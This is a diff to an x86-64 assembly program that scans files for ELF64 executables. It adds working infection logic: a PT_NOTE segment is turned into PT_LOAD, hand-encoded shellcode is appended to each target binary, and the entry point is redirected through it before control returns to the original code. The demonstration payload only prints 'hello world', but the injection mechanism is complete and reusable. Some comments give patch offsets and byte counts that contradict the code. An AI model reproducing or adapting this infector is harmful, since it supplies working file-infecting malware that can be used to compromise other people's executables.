@@ -21,18 +21,85 @@
 %define MAX_FILES       256
 %define FILE_ENTRY_SIZE PATH_BUFF_SIZE
 
+; Shellcode constants - must be defined before bss section
+; Shellcode is 76 bytes total with register preservation:
+;   14 bytes: push registers (rax, rbx, rcx, rdx, rsi, rdi, r8-r11)
+;   5 bytes: mov eax, 1
+;   5 bytes: mov edi, 1
+;   7 bytes: lea rsi, [rel hello_string]
+;   5 bytes: mov edx, 12
+;   2 bytes: syscall
+;   12 bytes: pop registers
+;   2 bytes: movabs rax prefix
+;   8 bytes: immediate address (patched at runtime)
+;   2 bytes: jmp rax
+;   12 bytes: "hello world\n"
+%define SHELLCODE_SIZE 76
+%define SHELLCODE_ENTRY_OFFSET 0x36          ; offset where to patch the original entry point
+
 section .bss
     path_buffer:    resb PATH_BUFF_SIZE       ; buffer for building full path
     file_list:      resb MAX_FILES * FILE_ENTRY_SIZE  ; storage for file paths
     file_count:     resq 1                    ; number of files stored
     elf_header_buf: resb 64                   ; buffer for reading ELF header
     elf_phdr_buf:   resb ELF64_PHDR_SIZE * MAX_PHDRS  ; buffer for program headers
+    shellcode_buf:  resb SHELLCODE_SIZE       ; buffer for patched shellcode
 
 section .data
     newline:        db 10               ; newline character
     msg_valid:      db " is a valid elf64 executable", 10, 0
     msg_invalid:    db " is not a valid elf64 executable", 10, 0
     msg_add_pt_load: db "add pt_load", 10, 0
+
+; Shellcode template that prints "hello world\n" and jumps to original entry point
+; This version preserves all registers to avoid corrupting dynamic linker state
+; Layout (offsets in hex):
+;   0x00-0x0D: push rax, rbx, rcx, rdx, rsi, rdi, r8, r9, r10, r11 (save registers)
+;   0x0E-0x12: mov eax, 1 (sys_write)
+;   0x13-0x17: mov edi, 1 (stdout)
+;   0x18-0x1E: lea rsi, [rel hello_string]
+;   0x1F-0x23: mov edx, 12
+;   0x24-0x25: syscall
+;   0x26-0x31: pop r11, r10, r9, r8, rdi, rsi, rdx, rcx, rbx, rax (restore registers)
+;   0x32-0x33: movabs rax prefix
+;   0x34-0x3B: 8-byte immediate (original entry point patched here at 0x34)
+;   0x3C-0x3D: jmp rax
+;   0x3E-0x49: "hello world\n" string
+shellcode_template:
+    ; Save all registers that the dynamic linker might use
+    db 0x50                                  ; push rax
+    db 0x53                                  ; push rbx
+    db 0x51                                  ; push rcx
+    db 0x52                                  ; push rdx
+    db 0x56                                  ; push rsi
+    db 0x57                                  ; push rdi
+    db 0x41, 0x50                            ; push r8
+    db 0x41, 0x51                            ; push r9
+    db 0x41, 0x52                            ; push r10
+    db 0x41, 0x53                            ; push r11
+    ; Print "hello world\n"
+    db 0xB8, 0x01, 0x00, 0x00, 0x00          ; mov eax, 1 (sys_write)
+    db 0xBF, 0x01, 0x00, 0x00, 0x00          ; mov edi, 1 (stdout)
+    db 0x48, 0x8D, 0x35, 0x21, 0x00, 0x00, 0x00  ; lea rsi, [rel hello_string] (offset +0x21 = 33 bytes ahead)
+    db 0xBA, 0x0C, 0x00, 0x00, 0x00          ; mov edx, 12 (length)
+    db 0x0F, 0x05                            ; syscall
+    ; Restore all registers
+    db 0x41, 0x5B                            ; pop r11
+    db 0x41, 0x5A                            ; pop r10
+    db 0x41, 0x59                            ; pop r9
+    db 0x41, 0x58                            ; pop r8
+    db 0x5F                                  ; pop rdi
+    db 0x5E                                  ; pop rsi
+    db 0x5A                                  ; pop rdx
+    db 0x59                                  ; pop rcx
+    db 0x5B                                  ; pop rbx
+    db 0x58                                  ; pop rax
+    ; Jump to original entry point (address patched at offset 0x34)
+    db 0x48, 0xB8                            ; movabs rax, <8-byte immediate follows>
+    db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  ; placeholder for original entry point
+    db 0xFF, 0xE0                            ; jmp rax
+    ; The string
+    db "hello world", 10                     ; 12 bytes
 
 section .text
 global _start
@@ -427,16 +494,24 @@ check_elf64_exec:
 ; rdi = pointer to file path
 ; Converts a PT_NOTE segment to PT_LOAD in the ELF file,
 ; pointing to the end of the file with filesz/memsz = 0x1000
+; Also modifies e_entry to point to injected shellcode that
+; prints "hello world" and jumps to the original entry point
 ; ============================================
 add_pt_load:
     push rbp
     mov rbp, rsp
-    sub rsp, 32                 ; allocate local variable space
+    sub rsp, 48                 ; allocate local variable space
     push r12                    ; saved file path
     push r13                    ; saved file descriptor
     push r14                    ; saved e_phoff
     push r15                    ; saved e_phnum
     push rbx                    ; saved e_phentsize
+
+    ; Stack layout:
+    ; [rbp-8]  = file size
+    ; [rbp-16] = PT_NOTE index
+    ; [rbp-24] = original e_entry
+    ; [rbp-32] = new p_vaddr (new entry point)
 
     mov r12, rdi                ; r12 = file path
 
@@ -487,6 +562,10 @@ add_pt_load:
     ; Get e_phoff (program header table offset) from ELF header at offset 32
     lea rdi, [rel elf_header_buf]
     mov r14, [rdi + e_phoff]    ; r14 = e_phoff
+
+    ; Save original e_entry (offset 24 in ELF header)
+    mov rax, [rdi + e_entry]
+    mov [rbp-24], rax           ; save original entry point
 
     ; Get e_phnum (number of program headers) from ELF header at offset 56
     movzx r15d, word [rdi + e_phnum]  ; r15 = e_phnum
@@ -565,13 +644,15 @@ add_pt_load:
     mov rax, [rbp-8]            ; get file size
     mov qword [rdi + p_offset], rax
 
-    ; p_vaddr = Compute aligned virtual address
-    ; We use a high address like 0xc000000 + aligned file offset
-    mov rcx, rax                ; file size
-    add rcx, 0xfff              ; align up to page boundary
-    and rcx, ~0xfff             ; clear low 12 bits
-    add rcx, 0xc000000          ; add base address offset
+    ; p_vaddr = Compute virtual address that is congruent with p_offset modulo page size
+    ; The formula is: p_vaddr = base_address + (p_offset & 0xfff)
+    ; where base_address is page-aligned and chosen to not conflict with existing segments
+    ; This ensures (p_vaddr % p_align) == (p_offset % p_align) for correct loading
+    mov rcx, rax                ; file size = p_offset
+    and rcx, 0xfff              ; get the page offset part (p_offset & 0xfff)
+    add rcx, 0xc000000          ; add base address offset (page-aligned)
     mov qword [rdi + p_vaddr], rcx
+    mov [rbp-32], rcx           ; save new p_vaddr (this becomes the new entry point)
 
     ; p_paddr = same as p_vaddr
     mov qword [rdi + p_paddr], rcx
@@ -585,8 +666,63 @@ add_pt_load:
     ; p_align = 0x1000 (4KB alignment)
     mov qword [rdi + p_align], 0x1000
 
+    ; Update e_entry in elf_header_buf to point to new PT_LOAD segment's p_vaddr
+    lea rdi, [rel elf_header_buf]
+    mov rax, [rbp-32]           ; new entry point (p_vaddr)
+    mov [rdi + e_entry], rax
+
+    ; Copy shellcode template to shellcode_buf and patch the original entry point
+    lea rsi, [rel shellcode_template]
+    lea rdi, [rel shellcode_buf]
+    mov rcx, SHELLCODE_SIZE
+.copy_shellcode:
+    mov al, [rsi]
+    mov [rdi], al
+    inc rsi
+    inc rdi
+    dec rcx
+    jnz .copy_shellcode
+
+    ; Patch the original entry point into shellcode at offset SHELLCODE_ENTRY_OFFSET
+    lea rdi, [rel shellcode_buf]
+    mov rax, [rbp-24]           ; original e_entry
+    mov [rdi + SHELLCODE_ENTRY_OFFSET], rax
+
+    ; Seek to end of file (p_offset of new PT_LOAD segment = file size)
+    mov eax, SYS_LSEEK
+    mov edi, r13d               ; fd
+    mov rsi, [rbp-8]            ; offset = file size
+    xor edx, edx                ; SEEK_SET = 0
+    syscall
+
+    test rax, rax
+    js .add_pt_load_close_fail
+
+    ; Write the patched shellcode to the end of the file
+    mov eax, SYS_WRITE
+    mov edi, r13d               ; fd
+    lea rsi, [rel shellcode_buf]
+    mov edx, SHELLCODE_SIZE
+    syscall
+
+    cmp rax, SHELLCODE_SIZE
+    jl .add_pt_load_close_fail
+
+    ; Seek to beginning of file to write updated ELF header
+    mov eax, SYS_LSEEK
+    mov edi, r13d               ; fd
+    xor esi, esi                ; offset = 0
+    xor edx, edx                ; SEEK_SET = 0
+    syscall
+
+    ; Write updated ELF header (with new e_entry)
+    mov eax, SYS_WRITE
+    mov edi, r13d               ; fd
+    lea rsi, [rel elf_header_buf]
+    mov edx, 64                 ; write 64 bytes (ELF header size)
+    syscall
+
     ; Seek to the program header table to write back the modified program headers
-    ; (We don't modify e_phnum - just convert PT_NOTE to PT_LOAD)
     mov eax, SYS_LSEEK
     mov edi, r13d               ; fd
     mov rsi, r14                ; offset = e_phoff
@@ -633,7 +769,7 @@ add_pt_load:
     pop r14
     pop r13
     pop r12
-    add rsp, 32                 ; deallocate local variable space
+    add rsp, 48                 ; deallocate local variable space
     mov rsp, rbp
     pop rbp
     ret
